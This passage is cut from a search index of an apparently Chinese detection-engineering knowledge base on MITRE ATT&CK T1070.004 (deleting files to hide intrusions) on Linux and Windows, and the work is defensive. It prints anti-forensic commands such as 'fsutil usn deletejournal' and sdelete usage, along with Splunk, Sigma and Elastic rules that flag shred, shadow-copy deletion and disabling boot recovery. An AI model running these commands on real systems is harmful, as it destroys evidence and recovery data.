abc.txt","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-linux-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-linux-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#splunk","text":"","title":"splunk\u89c4\u5219"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-linux-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#audit","text":"index=linux sourcetype=linux_audit syscall=59 comm=shred | table host,auid,msg index=linux sourcetype=linux_audit type=execve shred .bash_history | table host,msg,a0,a2 index=linux sourcetype=linux_audit syscall=263 | table host,auid,uid,eid,exe index=linux sourcetype=linux_audit syscall=82 exe=/usr/bin/shred | table host,auid,uid,eid,exe","title":"\u57fa\u4e8eaudit\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-linux-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#bash","text":"index=linux sourcetype=\"bash_history\" bash_command=\"rm \" OR bash_command=\"shred -u \"","title":"\u57fa\u4e8ebash\u5386\u53f2\u8bb0\u5f55"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-linux-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-linux-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_7","text":"MITRE-ATT&CK-T1070-004 https://attack.mitre.org/techniques/T1070/004/ linux\u4e0brm\u547d\u4ee4\u8be6\u89e3 https://www.cnblogs.com/ftl1012/p/9247107.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E4%BD%BF%E7%94%A8Fsutil%E5%88%A0%E9%99%A4%E5%8D%B7USN%E6%97%A5%E5%BF%97/","text":"T1070-004-win-\u4f7f\u7528Fsutil\u5220\u9664\u5377USN\u65e5\u5fd7 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5220\u9664\u5176\u5165\u4fb5\u6d3b\u52a8\u6240\u7559\u4e0b\u7684\u6587\u4ef6\u3002\u653b\u51fb\u8005\u5728\u7cfb\u7edf\u4e0a\u4e22\u5f03\u521b\u5efa\u7684\u6076\u610f\u8f6f\u4ef6\u3001\u5de5\u5177\u6216\u5176\u4ed6\u53ef\u80fd\u4f1a\u7559\u4e0b\u75d5\u8ff9\u7684\u975e\u672c\u673a\u6587\u4ef6\u3002\u8fd9\u4e9b\u6587\u4ef6\u7684\u5220\u9664\u53ef\u4ee5\u5728\u5165\u4fb5\u8fc7\u7a0b\u4e2d\u8fdb\u884c\uff0c\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u5165\u4fb5\u540e\u7684\u8fc7\u7a0b\u4e2d\u8fdb\u884c\uff0c\u4ee5\u6700\u5927\u7a0b\u5ea6\u5730\u51cf\u5c11\u653b\u51fb\u8005\u7559\u4e0b\u7684\u8db3\u8ff9\u3002 \u4e3b\u673a\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u63d0\u4f9b\u4e86\u4e00\u4e9b\u5de5\u5177\u6765\u6267\u884c\u6e05\u9664\uff0c\u4f46\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u5de5\u5177\u3002\u5176\u4e2d\u5305\u62ec\u672c\u673acmd\u51fd\u6570\uff08\u4f8b\u5982DEL\uff09\uff0c\u5b89\u5168\u5220\u9664\u5de5\u5177\uff08\u4f8b\u5982Windows Sysinternals SDelete\uff09\u6216\u5176\u4ed6\u7b2c\u4e09\u65b9\u6587\u4ef6\u5220\u9664\u5de5\u5177\u3002 \u6d4b\u8bd5\u6848\u4f8b \u8bc6\u522b\u4f7f\u7528fsutil.exe\u5220\u9664USN JRNL\u5377\u3002\u653b\u51fb\u8005\u4f7f\u7528\u6b64\u6280\u672f\u6765\u6d88\u9664\u5229\u7528\u6f0f\u6d1e\u540e\u521b\u5efa\u7684\u6587\u4ef6\u7684\u6d3b\u52a8\u8bc1\u636e\u3002 \u66f4\u591a\u59ff\u52bf\u53ef\u53c2\u8003\uff1a \u6e17\u900f\u6280\u5de7\u2014\u2014Windows\u4e0bNTFS\u6587\u4ef6\u7684USN Journal \u68c0\u6d4b\u65e5\u5fd7 windows security windows sysmon \u6d4b\u8bd5\u590d\u73b0 \u5173\u95edNTFS\u65e5\u5fd7\u529f\u80fd\uff1a \u5728cmd\u4e2d\u8fd0\u884c fsutil: fsutil usn createjournal m=1000 a=100 c: //\u521b\u5efa\u65e5\u5fd7 fsutil usn deletejournal /d c: //\u5220\u9664\u65e5\u5fd7 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0\uff0c\u4ec5\u63d0\u4f9b4688\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef6\u6837\u4f8b\u3002 windows server 2016/win10 A new process has been created. Subject: Security ID: WIN-R9H529RIO4Y\\Administrator Account Name: Administrator Account Domain: WIN-R9H529RIO4Y Logon ID: 0x1fd23 Process Information: New Process ID: 0xed0 New Process Name: C:\\Windows\\System32\\notepad.exe Token Elevation Type: TokenElevationTypeDefault (1) Mandatory Label: Mandatory Label\\Medium Mandatory Level Creator Process ID: 0x8c0 Creator Process Name: c:\\windows\\system32\\explorer.exe Process Command Line: C:\\Windows\\System32\\notepad.exe c:\\sys\\junk.txt \u68c0\u6d4b\u89c4\u5219/\u601d\u8def Sigma title: \u4f7f\u7528Fsutil\u5220\u9664\u5377USN\u65e5\u5fd7 description: \u8bc6\u522b\u4f7f\u7528fsutil.exe\u5220\u9664USN JRNL\u5377\u3002\u653b\u51fb\u8005\u4f7f\u7528\u6b64\u6280\u672f\u6765\u6d88\u9664\u5229\u7528\u6f0f\u6d1e\u540e\u521b\u5efa\u7684\u6587\u4ef6\u7684\u6d3b\u52a8\u8bc1\u636e\u3002 status: experimental references: - https://www.elastic.co/guide/en/siem/guide/current/delete-volume-usn-journal-with-fsutil.html#delete-volume-usn-journal-with-fsutil logsource: \u200b product: windows \u200b service: security detection: \u200b selection: \u200b EventID: \u200b - 1 #sysmon \u200b - 4688 #Windows \u5b89\u5168\u65e5\u5fd7 New Process Name: 'fsutil.exe' #Application Name Commanline: 'usn deletejournal' \u200b condition: selection level: low Elastic rule query event.action:\"Process Create (rule: ProcessCreate)\" and process.name:fsutil.exe and process.args:(deletejournal and usn) \u5efa\u8bae \u5982\u679c\u4f60\u5bf9windows\u6709\u8db3\u591f\u591a\u7684\u4e86\u89e3\uff0c\u90a3\u4e48\u76f8\u4fe1\u4f60\u4e5f\u77e5\u9053\u5e94\u8be5\u5982\u4f55\u53bb\u7528Windows\u65e5\u5fd7\u8fdb\u884c\u5206\u6790\u6b64\u7c7b\u653b\u51fb\u884c\u4e3a\uff0c\u6bd4\u5982\u4f9d\u97604688\u4e2d\u7684\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1070-004 https://attack.mitre.org/techniques/T1070/004/ \u6e17\u900f\u6280\u5de7\u2014\u2014Windows\u4e0bNTFS\u6587\u4ef6\u7684USN Journal http://app.myzaker.com/news/article.php?pk=5c6e106577ac642d40290442 \u4f7f\u7528Fsutil\u5220\u9664\u5377USN\u65e5\u5fd7 Elastic rule query https://www.elastic.co/guide/en/siem/guide/current/delete-volume-usn-journal-with-fsutil.html#delete-volume-usn-journal-with-fsutil 4688\u4e8b\u4ef6\u6837\u4f8b https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4688","title":"T1070-004-win-\u4f7f\u7528Fsutil\u5220\u9664\u5377USN\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E4%BD%BF%E7%94%A8Fsutil%E5%88%A0%E9%99%A4%E5%8D%B7USN%E6%97%A5%E5%BF%97/#t1070-004-win-fsutilusn","text":"","title":"T1070-004-win-\u4f7f\u7528Fsutil\u5220\u9664\u5377USN\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E4%BD%BF%E7%94%A8Fsutil%E5%88%A0%E9%99%A4%E5%8D%B7USN%E6%97%A5%E5%BF%97/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5220\u9664\u5176\u5165\u4fb5\u6d3b\u52a8\u6240\u7559\u4e0b\u7684\u6587\u4ef6\u3002\u653b\u51fb\u8005\u5728\u7cfb\u7edf\u4e0a\u4e22\u5f03\u521b\u5efa\u7684\u6076\u610f\u8f6f\u4ef6\u3001\u5de5\u5177\u6216\u5176\u4ed6\u53ef\u80fd\u4f1a\u7559\u4e0b\u75d5\u8ff9\u7684\u975e\u672c\u673a\u6587\u4ef6\u3002\u8fd9\u4e9b\u6587\u4ef6\u7684\u5220\u9664\u53ef\u4ee5\u5728\u5165\u4fb5\u8fc7\u7a0b\u4e2d\u8fdb\u884c\uff0c\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u5165\u4fb5\u540e\u7684\u8fc7\u7a0b\u4e2d\u8fdb\u884c\uff0c\u4ee5\u6700\u5927\u7a0b\u5ea6\u5730\u51cf\u5c11\u653b\u51fb\u8005\u7559\u4e0b\u7684\u8db3\u8ff9\u3002 \u4e3b\u673a\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u63d0\u4f9b\u4e86\u4e00\u4e9b\u5de5\u5177\u6765\u6267\u884c\u6e05\u9664\uff0c\u4f46\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u5de5\u5177\u3002\u5176\u4e2d\u5305\u62ec\u672c\u673acmd\u51fd\u6570\uff08\u4f8b\u5982DEL\uff09\uff0c\u5b89\u5168\u5220\u9664\u5de5\u5177\uff08\u4f8b\u5982Windows Sysinternals SDelete\uff09\u6216\u5176\u4ed6\u7b2c\u4e09\u65b9\u6587\u4ef6\u5220\u9664\u5de5\u5177\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E4%BD%BF%E7%94%A8Fsutil%E5%88%A0%E9%99%A4%E5%8D%B7USN%E6%97%A5%E5%BF%97/#_1","text":"\u8bc6\u522b\u4f7f\u7528fsutil.exe\u5220\u9664USN JRNL\u5377\u3002\u653b\u51fb\u8005\u4f7f\u7528\u6b64\u6280\u672f\u6765\u6d88\u9664\u5229\u7528\u6f0f\u6d1e\u540e\u521b\u5efa\u7684\u6587\u4ef6\u7684\u6d3b\u52a8\u8bc1\u636e\u3002 \u66f4\u591a\u59ff\u52bf\u53ef\u53c2\u8003\uff1a \u6e17\u900f\u6280\u5de7\u2014\u2014Windows\u4e0bNTFS\u6587\u4ef6\u7684USN Journal","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E4%BD%BF%E7%94%A8Fsutil%E5%88%A0%E9%99%A4%E5%8D%B7USN%E6%97%A5%E5%BF%97/#_2","text":"windows security windows sysmon","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E4%BD%BF%E7%94%A8Fsutil%E5%88%A0%E9%99%A4%E5%8D%B7USN%E6%97%A5%E5%BF%97/#_3","text":"\u5173\u95edNTFS\u65e5\u5fd7\u529f\u80fd\uff1a \u5728cmd\u4e2d\u8fd0\u884c fsutil: fsutil usn createjournal m=1000 a=100 c: //\u521b\u5efa\u65e5\u5fd7 fsutil usn deletejournal /d c: //\u5220\u9664\u65e5\u5fd7","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E4%BD%BF%E7%94%A8Fsutil%E5%88%A0%E9%99%A4%E5%8D%B7USN%E6%97%A5%E5%BF%97/#_4","text":"\u6682\u65e0\uff0c\u4ec5\u63d0\u4f9b4688\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef6\u6837\u4f8b\u3002 windows server 2016/win10 A new process has been created. Subject: Security ID: WIN-R9H529RIO4Y\\Administrator Account Name: Administrator Account Domain: WIN-R9H529RIO4Y Logon ID: 0x1fd23 Process Information: New Process ID: 0xed0 New Process Name: C:\\Windows\\System32\\notepad.exe Token Elevation Type: TokenElevationTypeDefault (1) Mandatory Label: Mandatory Label\\Medium Mandatory Level Creator Process ID: 0x8c0 Creator Process Name: c:\\windows\\system32\\explorer.exe Process Command Line: C:\\Windows\\System32\\notepad.exe c:\\sys\\junk.txt","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E4%BD%BF%E7%94%A8Fsutil%E5%88%A0%E9%99%A4%E5%8D%B7USN%E6%97%A5%E5%BF%97/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E4%BD%BF%E7%94%A8Fsutil%E5%88%A0%E9%99%A4%E5%8D%B7USN%E6%97%A5%E5%BF%97/#sigma","text":"title: \u4f7f\u7528Fsutil\u5220\u9664\u5377USN\u65e5\u5fd7 description: \u8bc6\u522b\u4f7f\u7528fsutil.exe\u5220\u9664USN JRNL\u5377\u3002\u653b\u51fb\u8005\u4f7f\u7528\u6b64\u6280\u672f\u6765\u6d88\u9664\u5229\u7528\u6f0f\u6d1e\u540e\u521b\u5efa\u7684\u6587\u4ef6\u7684\u6d3b\u52a8\u8bc1\u636e\u3002 status: experimental references: - https://www.elastic.co/guide/en/siem/guide/current/delete-volume-usn-journal-with-fsutil.html#delete-volume-usn-journal-with-fsutil logsource: \u200b product: windows \u200b service: security detection: \u200b selection: \u200b EventID: \u200b - 1 #sysmon \u200b - 4688 #Windows \u5b89\u5168\u65e5\u5fd7 New Process Name: 'fsutil.exe' #Application Name Commanline: 'usn deletejournal' \u200b condition: selection level: low","title":"Sigma"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E4%BD%BF%E7%94%A8Fsutil%E5%88%A0%E9%99%A4%E5%8D%B7USN%E6%97%A5%E5%BF%97/#elastic-rule-query","text":"event.action:\"Process Create (rule: ProcessCreate)\" and process.name:fsutil.exe and process.args:(deletejournal and usn)","title":"Elastic rule query"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E4%BD%BF%E7%94%A8Fsutil%E5%88%A0%E9%99%A4%E5%8D%B7USN%E6%97%A5%E5%BF%97/#_6","text":"\u5982\u679c\u4f60\u5bf9windows\u6709\u8db3\u591f\u591a\u7684\u4e86\u89e3\uff0c\u90a3\u4e48\u76f8\u4fe1\u4f60\u4e5f\u77e5\u9053\u5e94\u8be5\u5982\u4f55\u53bb\u7528Windows\u65e5\u5fd7\u8fdb\u884c\u5206\u6790\u6b64\u7c7b\u653b\u51fb\u884c\u4e3a\uff0c\u6bd4\u5982\u4f9d\u97604688\u4e2d\u7684\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u3002","title":"\u5efa\u8bae"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E4%BD%BF%E7%94%A8Fsutil%E5%88%A0%E9%99%A4%E5%8D%B7USN%E6%97%A5%E5%BF%97/#_7","text":"MITRE-ATT&CK-T1070-004 https://attack.mitre.org/techniques/T1070/004/ \u6e17\u900f\u6280\u5de7\u2014\u2014Windows\u4e0bNTFS\u6587\u4ef6\u7684USN Journal http://app.myzaker.com/news/article.php?pk=5c6e106577ac642d40290442 \u4f7f\u7528Fsutil\u5220\u9664\u5377USN\u65e5\u5fd7 Elastic rule query https://www.elastic.co/guide/en/siem/guide/current/delete-volume-usn-journal-with-fsutil.html#delete-volume-usn-journal-with-fsutil 4688\u4e8b\u4ef6\u6837\u4f8b https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4688","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/","text":"T1070-004-win-\u6587\u4ef6\u5220\u9664 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5220\u9664\u5176\u5165\u4fb5\u6d3b\u52a8\u6240\u7559\u4e0b\u7684\u6587\u4ef6\u3002\u653b\u51fb\u8005\u5728\u7cfb\u7edf\u4e0a\u4e22\u5f03\u521b\u5efa\u7684\u6076\u610f\u8f6f\u4ef6\u3001\u5de5\u5177\u6216\u5176\u4ed6\u53ef\u80fd\u4f1a\u7559\u4e0b\u75d5\u8ff9\u7684\u975e\u672c\u673a\u6587\u4ef6\u3002\u8fd9\u4e9b\u6587\u4ef6\u7684\u5220\u9664\u53ef\u4ee5\u5728\u5165\u4fb5\u8fc7\u7a0b\u4e2d\u8fdb\u884c\uff0c\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u5165\u4fb5\u540e\u7684\u8fc7\u7a0b\u4e2d\u8fdb\u884c\uff0c\u4ee5\u6700\u5927\u7a0b\u5ea6\u5730\u51cf\u5c11\u653b\u51fb\u8005\u7559\u4e0b\u7684\u8db3\u8ff9\u3002 \u4e3b\u673a\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u63d0\u4f9b\u4e86\u4e00\u4e9b\u5de5\u5177\u6765\u6267\u884c\u6e05\u9664\uff0c\u4f46\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u5de5\u5177\u3002\u5176\u4e2d\u5305\u62ec\u672c\u673acmd\u51fd\u6570\uff08\u4f8b\u5982DEL\uff09\uff0c\u5b89\u5168\u5220\u9664\u5de5\u5177\uff08\u4f8b\u5982Windows Sysinternals SDelete\uff09\u6216\u5176\u4ed6\u7b2c\u4e09\u65b9\u6587\u4ef6\u5220\u9664\u5de5\u5177\u3002 \u6d4b\u8bd5\u6848\u4f8b \u68c0\u6d4b\u65e5\u5fd7 windows security windows sysmon \u6d4b\u8bd5\u590d\u73b0 \u547d\u4ee4\u884c\u5de5\u5177\uff0c\u4f60\u9700\u8981\u5728cmd\u6216powershell\u4e2d\u8c03\u7528\u5b83\u3002 \u7528\u6cd5: sdelete [-p passes] [-r] [-s] [-q] <file or directory> [...] sdelete [-p passes] [-z|-c [percent free]] <drive letter [...]> sdelete [-p passes] [-z|-c] <physical disk number> -c \u6e05\u7406\u53ef\u7528\u7a7a\u95f4\u3002 \u6307\u5b9a\u9009\u9879\u7a7a\u95f4\u91cf \u7559\u7ed9\u6b63\u5728\u8fd0\u884c\u7684\u7cfb\u7edf\u514d\u8d39\u4f7f\u7528\u3002 -p \u6307\u5b9a\u8986\u76d6\u6b21\u6570\uff08\u9ed8\u8ba4\u4e3a1\uff09 -r \u5220\u9664\u53ea\u8bfb\u5c5e\u6027 -s \u9012\u5f52\u5b50\u76ee\u5f55 -z \u96f6\u53ef\u7528\u7a7a\u95f4\uff08\u9002\u7528\u4e8e\u865a\u62df\u78c1\u76d8\u4f18\u5316\uff09 -nobanner \u4e0d\u663e\u793a\u542f\u52a8\u6807\u8bed\u548c\u7248\u6743\u4fe1\u606f\u3002\u78c1\u76d8\u5fc5\u987b\u6ca1\u6709\u4efb\u4f55\u5377\u624d\u80fd\u88ab\u6e05\u7406\u3002 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u5728\u4e1a\u52a1\u73af\u5883\u4e2d\u627e\u5230\u4e0e\u826f\u6027\u547d\u4ee4\u884c\u529f\u80fd\uff08\u4f8b\u5982DEL\u6216\u7b2c\u4e09\u65b9\u5b9e\u7528\u7a0b\u5e8f\u6216\u5de5\u5177\uff09\u76f8\u5173\u7684\u4e8b\u4ef6\u7684\u60c5\u51b5\u5f88\u5c11\u89c1\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u7528\u6237\u7fa4\u548c\u7cfb\u7edf\u7684\u5178\u578b\u4f7f\u7528\u65b9\u5f0f\u3002\u76d1\u89c6\u547d\u4ee4\u884c\u5220\u9664\u529f\u80fd\u4ee5\u53ca\u76f8\u5173\u4f7f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u6216\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u7684\u5220\u9664\u6587\u4ef6\u8fdb\u884c\u5173\u8054\uff0c\u53ef\u80fd\u4f1a\u5e2e\u52a9\u5b89\u5168\u4eba\u5458\u68c0\u6d4b\u5230\u6076\u610f\u6d3b\u52a8\u3002\u53e6\u4e00\u4e2a\u597d\u7684\u505a\u6cd5\u662f\u76d1\u89c6\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5f15\u5165\u7684\u4f01\u4e1a\u7f51\u7edc\u4e2d\u7cfb\u7edf\u4e0a\u5c1a\u672a\u5b58\u5728\u7684\u5df2\u77e5\u5220\u9664\u548c\u5b89\u5168\u5220\u9664\u5de5\u5177\u3002\u67d0\u4e9b\u76d1\u89c6\u5de5\u5177\u53ef\u80fd\u4f1a\u6536\u96c6\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4f46\u53ef\u80fd\u65e0\u6cd5\u6355\u83b7DEL\u547d\u4ee4\uff0c\u56e0\u4e3aDEL\u662fcmd.exe\u4e2d\u7684\u672c\u673a\u51fd\u6570\u3002 splunk\u89c4\u5219 index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image IN (\u201c*\\\\sdelete.exe\u201d , \u201c*\\\\vssadmin.exe\u201d , \u201c*\\\\wmic.exe\u201d , \u201c*\\\\bcdedit.exe\u201d , \u201c*\\\\wbadmin.exe\u201d)) index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\vssadmin.exe\u201d CommandLine=\u201d*Delete Shadows*\u201d) index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\wmic.exe\u201d CommandLine=\u201d*shadowcopy delete*\u201d) index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\bcdedit.exe\u201d CommandLine IN (\u201c*bootstatuspolicy ignoreallfailures*\u201d , \u201c*recoveryenabled no*\u201d)) index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\wbadmin.exe\u201d CommandLine=\u201d*Delete*\u201d) \u5efa\u8bae \u5982\u679c\u4f60\u5bf9windows\u6709\u8db3\u591f\u591a\u7684\u4e86\u89e3\uff0c\u90a3\u4e48\u76f8\u4fe1\u4f60\u4e5f\u77e5\u9053\u5e94\u8be5\u5982\u4f55\u53bb\u7528Windows\u65e5\u5fd7\u8fdb\u884c\u5206\u6790\u6b64\u7c7b\u653b\u51fb\u884c\u4e3a\uff0c\u6bd4\u5982\u4f9d\u97604688\u4e2d\u7684\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1070-004 https://attack.mitre.org/techniques/T1070/004/ windows\u4f7f\u7528sdelete\u5b89\u5168\u7684\u5220\u9664\u6587\u4ef6 https://www.cnblogs.com/douzilink/p/13297433.html","title":"T1070-004-win-\u6587\u4ef6\u5220\u9664"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#t1070-004-win-","text":"","title":"T1070-004-win-\u6587\u4ef6\u5220\u9664"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5220\u9664\u5176\u5165\u4fb5\u6d3b\u52a8\u6240\u7559\u4e0b\u7684\u6587\u4ef6\u3002\u653b\u51fb\u8005\u5728\u7cfb\u7edf\u4e0a\u4e22\u5f03\u521b\u5efa\u7684\u6076\u610f\u8f6f\u4ef6\u3001\u5de5\u5177\u6216\u5176\u4ed6\u53ef\u80fd\u4f1a\u7559\u4e0b\u75d5\u8ff9\u7684\u975e\u672c\u673a\u6587\u4ef6\u3002\u8fd9\u4e9b\u6587\u4ef6\u7684\u5220\u9664\u53ef\u4ee5\u5728\u5165\u4fb5\u8fc7\u7a0b\u4e2d\u8fdb\u884c\uff0c\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u5165\u4fb5\u540e\u7684\u8fc7\u7a0b\u4e2d\u8fdb\u884c\uff0c\u4ee5\u6700\u5927\u7a0b\u5ea6\u5730\u51cf\u5c11\u653b\u51fb\u8005\u7559\u4e0b\u7684\u8db3\u8ff9\u3002 \u4e3b\u673a\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u63d0\u4f9b\u4e86\u4e00\u4e9b\u5de5\u5177\u6765\u6267\u884c\u6e05\u9664\uff0c\u4f46\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u5de5\u5177\u3002\u5176\u4e2d\u5305\u62ec\u672c\u673acmd\u51fd\u6570\uff08\u4f8b\u5982DEL\uff09\uff0c\u5b89\u5168\u5220\u9664\u5de5\u5177\uff08\u4f8b\u5982Windows Sysinternals SDelete\uff09\u6216\u5176\u4ed6\u7b2c\u4e09\u65b9\u6587\u4ef6\u5220\u9664\u5de5\u5177\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_1","text":"","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_2","text":"windows security windows sysmon","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_3","text":"\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u4f60\u9700\u8981\u5728cmd\u6216powershell\u4e2d\u8c03\u7528\u5b83\u3002 \u7528\u6cd5: sdelete [-p passes] [-r] [-s] [-q] <file or directory> [...] sdelete [-p passes] [-z|-c [percent free]] <drive letter [...]> sdelete [-p passes] [-z|-c] <physical disk number> -c \u6e05\u7406\u53ef\u7528\u7a7a\u95f4\u3002 \u6307\u5b9a\u9009\u9879\u7a7a\u95f4\u91cf \u7559\u7ed9\u6b63\u5728\u8fd0\u884c\u7684\u7cfb\u7edf\u514d\u8d39\u4f7f\u7528\u3002 -p \u6307\u5b9a\u8986\u76d6\u6b21\u6570\uff08\u9ed8\u8ba4\u4e3a1\uff09 -r \u5220\u9664\u53ea\u8bfb\u5c5e\u6027 -s \u9012\u5f52\u5b50\u76ee\u5f55 -z \u96f6\u53ef\u7528\u7a7a\u95f4\uff08\u9002\u7528\u4e8e\u865a\u62df\u78c1\u76d8\u4f18\u5316\uff09 -nobanner \u4e0d\u663e\u793a\u542f\u52a8\u6807\u8bed\u548c\u7248\u6743\u4fe1\u606f\u3002\u78c1\u76d8\u5fc5\u987b\u6ca1\u6709\u4efb\u4f55\u5377\u624d\u80fd\u88ab\u6e05\u7406\u3002","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_4","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_5","text":"\u5728\u4e1a\u52a1\u73af\u5883\u4e2d\u627e\u5230\u4e0e\u826f\u6027\u547d\u4ee4\u884c\u529f\u80fd\uff08\u4f8b\u5982DEL\u6216\u7b2c\u4e09\u65b9\u5b9e\u7528\u7a0b\u5e8f\u6216\u5de5\u5177\uff09\u76f8\u5173\u7684\u4e8b\u4ef6\u7684\u60c5\u51b5\u5f88\u5c11\u89c1\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u7528\u6237\u